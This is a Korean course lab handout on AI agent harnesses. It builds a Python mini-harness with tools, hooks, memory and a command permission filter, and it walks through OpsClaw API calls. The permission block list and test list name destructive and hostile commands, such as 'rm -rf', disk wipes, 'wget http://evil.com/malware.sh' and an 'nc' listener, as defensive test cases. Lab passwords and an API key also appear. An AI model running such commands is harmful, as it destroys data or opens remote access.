# Week 04: 에이전트 하네스 개론

## 학습 목표
- 에이전트 하네스(Harness)의 개념과 필요성을 이해한다
- Client-side 하네스와 Server-side 하네스의 차이를 설명할 수 있다
- 하네스의 7대 구성요소를 파악하고 각 역할을 구분한다
- OpsClaw(Server-side)와 Claude Code(Client-side) 하네스를 비교 분석한다
- 간단한 하네스 프레임워크를 직접 설계할 수 있다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:30 | 이론: 하네스란 무엇인가 (Part 1) | 강의 |
| 0:30-0:55 | 이론: 7대 구성요소와 하네스 비교 (Part 2) | 강의/토론 |
| 0:55-1:05 | 휴식 | - |
| 1:05-1:50 | 실습: 미니 하네스 프레임워크 구현 (Part 3) | 실습 |
| 1:50-2:35 | 실습: OpsClaw 하네스 탐색 (Part 4) | 실습 |
| 2:35-2:45 | 휴식 | - |
| 2:45-3:15 | 실습: Claude Code 하네스 구조 분석 (Part 5) | 실습 |
| 3:15-3:30 | 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---

## 용어 해설 (AI보안에이전트 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **하네스** | Harness | 에이전트의 실행 환경·제어 프레임워크 | 마구(馬具) — 말을 안전하게 제어 |
| **Client-side 하네스** | Client-side Harness | 사용자 단말에서 실행되는 에이전트 하네스 | 개인 비서 |
| **Server-side 하네스** | Server-side Harness | 서버에서 운영되는 중앙 집중식 하네스 | 중앙 관제센터 |
| **Tool** | Tool | 에이전트가 사용하는 외부 기능/함수 | 공구함의 도구 |
| **Skill** | Skill | 복합 도구를 묶은 고수준 능력 | 자격증 (여러 기술의 조합) |
| **Hook** | Hook | 특정 이벤트 전후에 자동 실행되는 코드 | 문 앞의 센서 알람 |
| **Memory** | Memory | 에이전트의 장기/단기 기억 저장소 | 업무 노트 |
| **Agent** | Agent | 자율적으로 작업을 수행하는 실행 단위 | 현장 요원 |
| **Task** | Task | 에이전트에게 할당된 개별 작업 단위 | 업무 티켓 |
| **Permission** | Permission | 에이전트의 행동 범위를 제한하는 규칙 | 출입 권한 카드 |
| **Orchestration** | Orchestration | 여러 에이전트/도구를 조율하는 행위 | 지휘자의 지휘 |
| **CLAUDE.md** | CLAUDE.md | Claude Code에서 프로젝트 규칙을 정의하는 파일 | 프로젝트 헌법 |
| **MCP** | Model Context Protocol | LLM에 외부 도구/데이터를 연결하는 프로토콜 | USB 허브 |
| **SubAgent** | SubAgent | 원격 서버에서 명령을 실행하는 하위 에이전트 | 현장 파견 요원 |
| **Playbook** | Playbook | 사전 정의된 작업 절차 | 작전 교범 |
| **PoW** | Proof of Work | 작업 증명 메커니즘 | 공사 완료 확인서 |
| **dry_run** | Dry Run | 실제 실행 없이 시뮬레이션만 수행 | 예행 연습 |

---

## Part 1: 하네스란 무엇인가 (30분) — 이론

### 1.1 에이전트 하네스의 정의

**하네스(Harness)** 는 AI 에이전트를 **안전하게 제어하고 실행하는 프레임워크**이다.

LLM 자체는 텍스트만 생성한다. 하네스가 다음을 제공한다:
- **도구 연결**: LLM이 외부 시스템과 상호작용할 수 있게 함
- **실행 제어**: 에이전트의 행동 범위를 제한
- **상태 관리**: 대화 기록, 작업 진행 상황 추적
- **안전 장치**: 위험한 행동 차단, 승인 요청

```
  에이전트 하네스
  |  Tools  |  |  Skills  |  |  Memory  |
  |  LLM (Brain)  |
  |  Hooks  |  |  Tasks  |  |Permissions|
  |  Agents (실행 단위)  |
```

### 1.2 왜 하네스가 필요한가?

| 문제 | 하네스 없이 | 하네스 있으면 |
|------|-----------|-------------|
| 보안 | LLM이 rm -rf / 실행 가능 | Permission으로 차단 |
| 추적 | 무엇을 했는지 기록 없음 | Evidence/PoW로 모든 행동 기록 |
| 일관성 | 매번 다른 방식으로 작업 | Playbook으로 표준화 |
| 확장 | 단일 서버에서만 작동 | SubAgent로 다중 서버 제어 |
| 협업 | 한 명만 사용 가능 | 여러 사용자/에이전트 동시 운영 |

### 1.3 Client-side vs Server-side

| 구분 | Client-side | Server-side |
|------|------------|------------|
| 대표 | Claude Code, Cursor | OpsClaw, LangGraph |
| 실행 위치 | 사용자 로컬 PC | 원격 서버 |
| 제어 방식 | 사용자가 실시간 확인 | API/정책으로 자동 제어 |
| 적합한 작업 | 개발, 코드 리뷰, 탐색 | 인프라 운영, 정기 점검, 자동 대응 |
| 안전 장치 | 사용자 승인 프롬프트 | Permission + dry_run + PoW |
| 상태 저장 | 로컬 파일/메모리 | 데이터베이스 |
| 다중 서버 | SSH/MCP로 접근 | SubAgent 분산 실행 |

---

## Part 2: 7대 구성요소와 하네스 비교 (25분) — 이론/토론

### 2.1 하네스의 7대 구성요소

| # | 구성요소 | 역할 | OpsClaw | Claude Code |
|---|---------|------|---------|-------------|
| 1 | **Tools** | 외부 시스템과 상호작용 | run_command, fetch_log, query_metric | Bash, Read, Write, Grep |
| 2 | **Skills** | 복합 도구의 고수준 조합 | probe_linux_host, analyze_wazuh_alert | MCP 서버 |
| 3 | **Hooks** | 이벤트 전후 자동 실행 | (내장: PoW 자동 기록) | pre/post command hooks |
| 4 | **Memory** | 컨텍스트·기록 유지 | PostgreSQL DB | CLAUDE.md, .claude/ |
| 5 | **Agents** | 실행 주체 | SubAgent (원격) | Claude (로컬) |
| 6 | **Tasks** | 작업 단위 | execute-plan tasks 배열 | 사용자 대화 턴 |
| 7 | **Permissions** | 행동 제한 | risk_level, dry_run | .claude/settings.json |

### 2.2 하네스 비교: OpsClaw vs Claude Code

```
  [Client-side] Claude Code
  사용자 ←→ Claude LLM ←→ Tools (Bash/Read/Write)
  → CLAUDE.md (규칙)
  → MCP 서버 (외부 도구)
  → Hooks (이벤트)
  장점: 실시간 대화, 유연한 탐색
  단점: 로컬 실행만, 자동화 어려움

  [Server-side] OpsClaw
  Claude/사용자 → Manager API → SubAgent(secu)
  → SubAgent(web)
  → SubAgent(siem)
  Manager: Project → Plan → Execute → Evidence → Report
  Playbook, PoW, RL, 스케줄러
  장점: 다중 서버, 자동화, 감사 추적
  단점: API 호출 필요, 설정 복잡
```

### 2.3 토론: 어떤 하네스를 언제 사용하는가?

| 시나리오 | 추천 하네스 | 이유 |
|---------|-----------|------|
| 코드 리뷰/개발 | Claude Code | 대화형, 파일 편집 |
| 정기 보안 점검 | OpsClaw | 스케줄, 자동화, 증적 |
| 사고 대응 | 하이브리드 | Claude Code로 분석 + OpsClaw로 실행 |
| 규정 준수 감사 | OpsClaw | PoW 증적, 보고서 |

---

## Part 3: 미니 하네스 프레임워크 구현 (45분) — 실습

### 3.1 Python으로 미니 하네스 설계

> **실습 목적**: 에이전트가 메모리를 활용하여 과거 대화/행동을 참조하고 맥락을 유지하는 기능을 구현하기 위해 수행한다
>
> **배우는 것**: 단기 메모리(대화 이력)와 장기 메모리(요약/검색)의 차이, 컨텍스트 윈도우 관리 전략을 이해한다
>
> **결과 해석**: 에이전트가 과거 대화를 참조하여 일관된 응답을 하면 메모리가 정상 동작하는 것이다
>
> **실전 활용**: 인시던트 타임라인 추적 에이전트, 반복 작업의 맥락 유지, 장기 보안 모니터링 에이전트 개발에 활용한다

```bash
# 작업 디렉토리 생성
mkdir -p ~/lab/week04

cat > ~/lab/week04/mini_harness.py << 'PYEOF'
"""
Week 04 실습: 미니 에이전트 하네스
7대 구성요소를 모두 포함하는 간단한 하네스를 구현한다.
"""
import requests
import json
import subprocess
import datetime
import os

OLLAMA_URL = "http://192.168.0.105:11434/v1/chat/completions"
MODEL = "llama3.1:8b"

# ============================================================
# 1. TOOLS — 에이전트가 사용하는 도구
# ============================================================
class ToolRegistry:
    """도구 등록소: 에이전트가 사용할 수 있는 도구를 관리"""

    def __init__(self):
        self._tools = {}

    def register(self, name: str, func, description: str, params: dict):
        """도구 등록"""
        self._tools[name] = {
            "func": func,
            "description": description,
            "params": params,
        }

    def execute(self, name: str, args: dict) -> str:
        """도구 실행"""
        if name not in self._tools:
            return f"오류: '{name}' 도구를 찾을 수 없습니다"
        return self._tools[name]["func"](**args)

    def get_descriptions(self) -> str:
        """도구 설명 목록 (프롬프트에 포함용)"""
        lines = []
        for name, info in self._tools.items():
            params_str = ", ".join(f"{k}:{v}" for k, v in info["params"].items())
            lines.append(f"- {name}({params_str}): {info['description']}")
        return "\n".join(lines)

# 도구 함수 정의
def tool_run_command(command: str) -> str:
    """로컬 쉘 명령 실행"""
    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=15)
    return result.stdout.strip() or result.stderr.strip()

def tool_check_disk(path: str = "/") -> str:
    """디스크 사용량 확인"""
    return tool_run_command(f"df -h {path}")

def tool_check_ports() -> str:
    """열린 포트 확인"""
    return tool_run_command("ss -tlnp | head -15")

# ============================================================
# 2. SKILLS — 복합 도구 조합
# ============================================================
class SkillRegistry:
    """스킬 등록소: 여러 도구를 조합한 고수준 능력"""

    def __init__(self, tools: ToolRegistry):
        self._skills = {}
        self._tools = tools

    def register(self, name: str, steps: list, description: str):
        """스킬 등록 (steps: [(tool_name, args), ...])"""
        self._skills[name] = {"steps": steps, "description": description}

    def execute(self, name: str) -> list:
        """스킬 실행: 모든 도구를 순차 실행"""
        skill = self._skills.get(name)
        if not skill:
            return [f"오류: '{name}' 스킬이 없습니다"]
        results = []
        for tool_name, args in skill["steps"]:
            result = self._tools.execute(tool_name, args)
            results.append({"tool": tool_name, "result": result})
        return results

# ============================================================
# 3. HOOKS — 이벤트 전후 실행
# ============================================================
class HookManager:
    """이벤트 훅 관리자"""

    def __init__(self):
        self._hooks = {"before_execute": [], "after_execute": [], "on_error": []}

    def register(self, event: str, func):
        """훅 등록"""
        if event in self._hooks:
            self._hooks[event].append(func)

    def trigger(self, event: str, context: dict):
        """훅 실행"""
        for func in self._hooks.get(event, []):
            func(context)

# ============================================================
# 4. MEMORY — 기억 저장소
# ============================================================
class Memory:
    """에이전트 메모리: 대화 기록과 작업 이력 관리"""

    def __init__(self):
        self.conversation = []
        self.task_history = []

    def add_message(self, role: str, content: str):
        """대화 기록 추가"""
        self.conversation.append({"role": role, "content": content})

    def add_task_result(self, task: dict):
        """작업 결과 기록"""
        task["timestamp"] = datetime.datetime.now().isoformat()
        self.task_history.append(task)

    def get_context(self) -> str:
        """기억 요약 반환"""
        if not self.task_history:
            return "이전 작업 이력 없음"
        recent = self.task_history[-3:]
        return json.dumps(recent, indent=2, ensure_ascii=False)

# ============================================================
# 5. PERMISSIONS — 행동 제한
# ============================================================
class PermissionManager:
    """권한 관리자: 에이전트 행동 제한"""

    def __init__(self):
        # 차단할 명령 패턴
        self.blocked_patterns = [
            "rm -rf", "mkfs", "dd if=", "shutdown", "reboot",
            "DROP TABLE", "DELETE FROM", "> /dev/sda",
        ]
        # 허용할 명령 접두사
        self.allowed_prefixes = [
            "df", "free", "ps", "ss", "cat", "head", "tail",
            "grep", "find", "ls", "uptime", "who", "last",
            "nft list", "systemctl status",
        ]

    def check(self, command: str) -> tuple:
        """명령 실행 가능 여부 확인 → (허용여부, 이유)"""
        # 차단 패턴 검사
        for pattern in self.blocked_patterns:
            if pattern.lower() in command.lower():
                return False, f"차단됨: '{pattern}' 패턴 탐지"
        # 허용 접두사 검사
        for prefix in self.allowed_prefixes:
            if command.strip().startswith(prefix):
                return True, "허용된 명령"
        return False, f"미허용 명령: 화이트리스트에 없음"

# ============================================================
# 6. TASK — 작업 단위
# ============================================================
class Task:
    """작업 단위"""

    def __init__(self, instruction: str, risk_level: str = "low"):
        self.instruction = instruction
        self.risk_level = risk_level
        self.status = "pending"
        self.result = None

# ============================================================
# 7. AGENT — 하네스 통합 실행
# ============================================================
class MiniAgent:
    """미니 에이전트: 7대 구성요소를 통합"""

    def __init__(self):
        # 구성요소 초기화
        self.tools = ToolRegistry()
        self.skills = SkillRegistry(self.tools)
        self.hooks = HookManager()
        self.memory = Memory()
        self.permissions = PermissionManager()

        # 도구 등록
        self.tools.register("run_command", tool_run_command, "쉘 명령 실행", {"command": "str"})
        self.tools.register("check_disk", tool_check_disk, "디스크 확인", {"path": "str"})
        self.tools.register("check_ports", tool_check_ports, "포트 확인", {})

        # 스킬 등록
        self.skills.register("basic_health_check", [
            ("check_disk", {"path": "/"}),
            ("check_ports", {}),
            ("run_command", {"command": "uptime"}),
        ], "기본 서버 상태 점검")

        # 훅 등록
        self.hooks.register("before_execute", lambda ctx: print(f"  [HOOK] 실행 시작: {ctx.get('command','')}"))
        self.hooks.register("after_execute", lambda ctx: print(f"  [HOOK] 실행 완료: {ctx.get('status','')}"))

    def execute_task(self, task: Task) -> dict:
        """태스크 실행"""
        print(f"\n[TASK] {task.instruction} (risk: {task.risk_level})")

        # 권한 확인
        allowed, reason = self.permissions.check(task.instruction)
        if not allowed:
            task.status = "blocked"
            task.result = reason
            print(f"  [PERMISSION] 차단: {reason}")
            return {"status": "blocked", "reason": reason}

        # before 훅 실행
        self.hooks.trigger("before_execute", {"command": task.instruction})

        # 도구 실행
        result = self.tools.execute("run_command", {"command": task.instruction})
        task.status = "completed"
        task.result = result

        # after 훅 실행
        self.hooks.trigger("after_execute", {"status": "success"})

        # 메모리에 기록
        self.memory.add_task_result({
            "instruction": task.instruction,
            "result": result[:200],
            "status": "completed"
        })

        return {"status": "completed", "result": result}

    def run_skill(self, skill_name: str) -> list:
        """스킬 실행"""
        print(f"\n[SKILL] {skill_name}")
        results = self.skills.execute(skill_name)
        for r in results:
            self.memory.add_task_result(r)
        return results

    def ask_llm(self, question: str) -> str:
        """LLM에게 질문 (메모리 컨텍스트 포함)"""
        context = self.memory.get_context()
        self.memory.add_message("user", question)

        resp = requests.post(OLLAMA_URL, json={
            "model": MODEL,
            "messages": [
                {"role": "system", "content": f"보안 관리자 AI. 이전 작업 기록:\n{context}"},
                {"role": "user", "content": question}
            ],
            "temperature": 0.2,
        }, timeout=120)
        answer = resp.json()["choices"][0]["message"]["content"]
        self.memory.add_message("assistant", answer)
        return answer

# ============================================================
# 메인 실행
# ============================================================
if __name__ == "__main__":
    print("=" * 60)
    print("미니 에이전트 하네스 — 7대 구성요소 데모")
    print("=" * 60)

    agent = MiniAgent()

    # 1. 스킬 실행
    print("\n>>> 스킬: basic_health_check")
    results = agent.run_skill("basic_health_check")
    for r in results:
        print(f"  {r['tool']}: {r['result'][:100]}")

    # 2. 허용된 태스크
    t1 = Task("df -h /", risk_level="low")
    agent.execute_task(t1)
    print(f"  결과: {t1.result[:100]}")

    # 3. 차단된 태스크
    t2 = Task("rm -rf /tmp/*", risk_level="critical")
    agent.execute_task(t2)

    # 4. LLM 분석 (메모리 활용)
    print("\n>>> LLM에게 분석 요청 (이전 작업 기록 포함)")
    answer = agent.ask_llm("지금까지 수행한 점검 결과를 종합 분석해줘")
    print(f"  LLM: {answer[:300]}")

    # 5. 메모리 확인
    print(f"\n>>> 메모리 상태")
    print(f"  작업 이력: {len(agent.memory.task_history)}건")
    print(f"  대화 기록: {len(agent.memory.conversation)}턴")
PYEOF

# 미니 하네스 실행
python3 ~/lab/week04/mini_harness.py
```

### 3.2 Permission 테스트

```bash
cat > ~/lab/week04/permission_test.py << 'PYEOF'
"""
Week 04 실습: Permission 시스템 테스트
다양한 명령에 대한 권한 검사를 수행한다.
"""
import sys
sys.path.insert(0, "/root/lab/week04")
from mini_harness import PermissionManager

pm = PermissionManager()

# 테스트할 명령 목록
test_commands = [
    # 안전한 명령 (허용 예상)
    "df -h /",
    "ps aux | head -10",
    "ss -tlnp",
    "cat /etc/hostname",
    "uptime",
    "nft list ruleset",
    "systemctl status sshd",
    # 위험한 명령 (차단 예상)
    "rm -rf /var/log",
    "shutdown -h now",
    "dd if=/dev/zero of=/dev/sda",
    "DROP TABLE users;",
    "mkfs.ext4 /dev/sdb1",
    # 미분류 명령 (차단 예상 — 화이트리스트에 없음)
    "wget http://evil.com/malware.sh",
    "curl http://10.0.0.1/admin",
    "nc -lvp 4444",
    "python3 -c 'import os; os.system(\"id\")'",
]

print(f"{'명령':<45} {'결과':<8} {'이유'}")
print("-" * 90)
for cmd in test_commands:
    allowed, reason = pm.check(cmd)
    status = "허용" if allowed else "차단"
    # 결과를 색상으로 구분
    print(f"{cmd:<45} {status:<8} {reason}")
PYEOF

# Permission 테스트 실행
python3 ~/lab/week04/permission_test.py
```

---

## Part 4: OpsClaw 하네스 탐색 (45분) — 실습

### 4.1 OpsClaw의 하네스 구성요소 확인

```bash
# OpsClaw Manager API 상태 확인
curl -s -H "X-API-Key: opsclaw-api-key-2026" \
  http://localhost:8000/health | python3 -m json.tool

# 등록된 Tools 확인 (SubAgent 런타임)
curl -s http://localhost:8002/tools 2>/dev/null | python3 -m json.tool || \
  echo "SubAgent 미기동 — 아래 명령으로 확인"

# Skills 목록 확인
curl -s http://localhost:8002/skills 2>/dev/null | python3 -m json.tool || \
  echo "SubAgent 미기동"
```

### 4.2 OpsClaw 하네스를 통한 작업 실행

```bash
# 1. 프로젝트 생성 (하네스 진입점)
PROJECT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "name": "week04-harness-demo",
    "request_text": "하네스 구성요소 탐색 실습",
    "master_mode": "external"
  }')
# 프로젝트 ID 추출
PID=$(echo $PROJECT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")
echo "Project ID: $PID"

# 2. Stage 전환 (Task 생명주기)
# plan 단계로 전환
curl -s -X POST http://localhost:8000/projects/${PID}/plan \
  -H "X-API-Key: opsclaw-api-key-2026" | python3 -c "import sys,json; print('Stage:', json.load(sys.stdin).get('stage'))"

# execute 단계로 전환
curl -s -X POST http://localhost:8000/projects/${PID}/execute \
  -H "X-API-Key: opsclaw-api-key-2026" | python3 -c "import sys,json; print('Stage:', json.load(sys.stdin).get('stage'))"
```

### 4.3 execute-plan으로 Task 배열 실행

```bash
# execute-plan: 여러 Task를 한 번에 실행 (OpsClaw의 핵심 기능)
curl -s -X POST http://localhost:8000/projects/${PID}/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "hostname && uptime",
        "risk_level": "low",
        "subagent_url": "http://localhost:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "df -h / | tail -1",
        "risk_level": "low",
        "subagent_url": "http://localhost:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "ss -tlnp | grep -c LISTEN",
        "risk_level": "low",
        "subagent_url": "http://localhost:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

### 4.4 Evidence와 PoW 확인 (Memory + Hook)

```bash
# Evidence 요약 (하네스의 Memory 역할)
curl -s -H "X-API-Key: opsclaw-api-key-2026" \
  http://localhost:8000/projects/${PID}/evidence/summary | python3 -m json.tool

# PoW 블록 확인 (하네스의 Hook 역할 — 자동 기록)
curl -s -H "X-API-Key: opsclaw-api-key-2026" \
  "http://localhost:8000/pow/blocks?agent_id=http://localhost:8002" | python3 -m json.tool

# PoW 체인 무결성 검증
curl -s -H "X-API-Key: opsclaw-api-key-2026" \
  "http://localhost:8000/pow/verify?agent_id=http://localhost:8002" | python3 -m json.tool
```

### 4.5 완료 보고서 (Agent output)

```bash
# 완료 보고서 작성
curl -s -X POST http://localhost:8000/projects/${PID}/completion-report \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "summary": "Week04 하네스 탐색 실습 완료",
    "outcome": "success",
    "work_details": [
      "OpsClaw 7대 구성요소 확인",
      "execute-plan으로 3개 태스크 실행",
      "PoW 증적 기록 확인"
    ]
  }' | python3 -m json.tool

# 프로젝트 전체 Replay (작업 재현)
curl -s -H "X-API-Key: opsclaw-api-key-2026" \
  http://localhost:8000/projects/${PID}/replay | python3 -m json.tool
```

---

## Part 5: Claude Code 하네스 구조 분석 (30분) — 실습

### 5.1 Claude Code의 구성 파일 분석

```bash
# Claude Code 프로젝트 설정 파일 확인 (CLAUDE.md)
cat /home/opsclaw/opsclaw/CLAUDE.md | head -60

# Claude Code 사용자 설정 디렉토리 확인
ls -la ~/.claude/ 2>/dev/null || echo ".claude/ 디렉토리 없음 — Claude Code 미설치"
```

### 5.2 CLAUDE.md 구조 이해 실습

```bash
cat > ~/lab/week04/claudemd_anatomy.py << 'PYEOF'
"""
Week 04 실습: CLAUDE.md 구조 분석
Claude Code 하네스의 핵심 설정 파일을 분석한다.
"""
import re

# CLAUDE.md 읽기
claudemd_path = "/home/opsclaw/opsclaw/CLAUDE.md"
with open(claudemd_path, "r") as f:
    content = f.read()

# 섹션 추출
sections = re.findall(r'^## (.+)$', content, re.MULTILINE)
print("CLAUDE.md 섹션 목록:")
for i, s in enumerate(sections, 1):
    print(f"  {i}. {s}")

# 하네스 구성요소 매핑
print("\n하네스 구성요소 ↔ CLAUDE.md 매핑:")
mappings = [
    ("Tools", "등록된 Tool/Skill 섹션 — run_command, fetch_log 등"),
    ("Skills", "등록된 Tool/Skill 섹션 — probe_linux_host, analyze_wazuh_alert 등"),
    ("Hooks", "PoW & 보상 섹션 — execute-plan 시 자동 PoW 기록"),
    ("Memory", "상세 문서 섹션 — DB에 evidence 기록"),
    ("Agents", "인프라 구성 섹션 — SubAgent 목록"),
    ("Tasks", "핵심 작업 흐름 — execute-plan tasks 배열"),
    ("Permissions", "중요 규칙 섹션 — risk_level, dry_run, 파괴적 명령 금지"),
]
for component, mapping in mappings:
    print(f"  [{component:12s}] → {mapping}")

# 규칙 추출
rules = re.findall(r'- (.+파괴.+|.+금지.+|.+필수.+|.+반드시.+)', content)
print(f"\n안전 규칙 ({len(rules)}건):")
for r in rules[:5]:
    print(f"  - {r.strip()}")
PYEOF

# CLAUDE.md 분석 실행
python3 ~/lab/week04/claudemd_anatomy.py
```

### 5.3 하네스 비교표 작성

```bash
cat > ~/lab/week04/harness_comparison.py << 'PYEOF'
"""
Week 04 실습: 하네스 비교표 생성
OpsClaw와 Claude Code의 하네스를 7대 구성요소별로 비교한다.
"""
import json

comparison = {
    "comparison_title": "에이전트 하네스 비교: OpsClaw vs Claude Code",
    "components": [
        {
            "name": "Tools",
            "opsclaw": {
                "implementation": "Manager API의 dispatch/execute-plan → SubAgent 실행",
                "examples": ["run_command", "fetch_log", "query_metric", "read_file"],
                "extensibility": "Python 함수로 Tool 추가 가능"
            },
            "claude_code": {
                "implementation": "내장 도구 (Bash, Read, Write, Grep, Glob 등)",
                "examples": ["Bash", "Read", "Write", "Edit", "Grep", "WebFetch"],
                "extensibility": "MCP 서버로 확장"
            }
        },
        {
            "name": "Skills",
            "opsclaw": {
                "implementation": "Playbook + 등록 Skill",
                "examples": ["probe_linux_host", "check_tls_cert", "analyze_wazuh_alert_burst"],
            },
            "claude_code": {
                "implementation": "MCP 서버 + 슬래시 명령",
                "examples": ["MCP tools", "/commit", "/review-pr"],
            }
        },
        {
            "name": "Hooks",
            "opsclaw": {
                "implementation": "PoW 자동 기록, 보상 자동 계산",
                "trigger": "execute-plan 실행 시",
            },
            "claude_code": {
                "implementation": "settings.json hooks 배열",
                "trigger": "명령 실행 전/후, 알림 전후",
            }
        },
        {
            "name": "Memory",
            "opsclaw": {
                "storage": "PostgreSQL DB",
                "scope": "프로젝트 단위 evidence, PoW 블록",
            },
            "claude_code": {
                "storage": "CLAUDE.md, .claude/ 디렉토리, MEMORY.md",
                "scope": "프로젝트/사용자 단위",
            }
        },
        {
            "name": "Permissions",
            "opsclaw": {
                "mechanism": "risk_level (low/medium/high/critical), dry_run",
                "enforcement": "critical → 자동 dry_run, confirmed:true로 해제",
            },
            "claude_code": {
                "mechanism": "settings.json allow/deny 패턴",
                "enforcement": "사용자 승인 프롬프트",
            }
        },
    ]
}

# 결과 저장
with open("/root/lab/week04/harness_comparison.json", "w") as f:
    json.dump(comparison, f, indent=2, ensure_ascii=False)

# 표 형태로 출력
print(f"{'구성요소':<12} {'OpsClaw':^35} {'Claude Code':^35}")
print("=" * 82)
for comp in comparison["components"]:
    ops_desc = comp["opsclaw"].get("implementation", comp["opsclaw"].get("mechanism", ""))[:32]
    cc_desc = comp["claude_code"].get("implementation", comp["claude_code"].get("mechanism", ""))[:32]
    print(f"{comp['name']:<12} {ops_desc:<35} {cc_desc:<35}")
PYEOF

# 비교표 생성
python3 ~/lab/week04/harness_comparison.py
```

---

## Part 6: 퀴즈 + 과제 (15분)

### 복습 퀴즈

**Q1. 에이전트 하네스의 주요 역할이 아닌 것은?**
- (A) 도구 연결
- (B) 실행 제어
- **(C) LLM 모델 학습** ✅
- (D) 안전 장치

**Q2. OpsClaw는 어떤 유형의 하네스인가?**
- (A) Client-side 하네스
- **(B) Server-side 하네스** ✅
- (C) Hybrid 하네스
- (D) Standalone 하네스

**Q3. 하네스의 7대 구성요소에 포함되지 않는 것은?**
- (A) Tools
- (B) Skills
- (C) Permissions
- **(D) Database** ✅

**Q4. OpsClaw에서 critical risk_level 태스크의 기본 동작은?**
- (A) 즉시 실행된다
- **(B) dry_run이 자동 강제된다** ✅
- (C) 거부된다
- (D) 관리자에게 이메일이 발송된다

**Q5. CLAUDE.md의 역할로 가장 적절한 것은?**
- (A) LLM 모델의 가중치를 저장한다
- (B) 데이터베이스 스키마를 정의한다
- **(C) 에이전트의 프로젝트 규칙과 컨텍스트를 정의한다** ✅
- (D) 사용자 인증 정보를 저장한다

### 과제

**[과제] 미니 하네스 확장**

1. `mini_harness.py`에 다음을 추가하라:
   - 새 Tool 2개: `check_ssh_config`(SSH 설정 확인), `check_crontab`(크론 작업 확인)
   - 새 Skill 1개: `security_audit` (위 도구들을 조합한 보안 감사)
   - Permission에 `risk_level` 개념 추가 (low/medium/high/critical)

2. LLM에게 "보안 감사를 실행해줘"라고 요청하여 스킬이 자동 실행되도록 구현하라.

3. 결과를 `~/lab/week04/homework.md`에 정리하라.

**제출물:** 수정된 `mini_harness.py` + `homework.md`

---

> **다음 주 예고:** Week 05에서는 OpsClaw을 Server-side 하네스로 본격 구축한다. Native Mode(Master Service)를 설정하고, Ollama를 연동하여 자연어→실행 파이프라인을 구축한다.
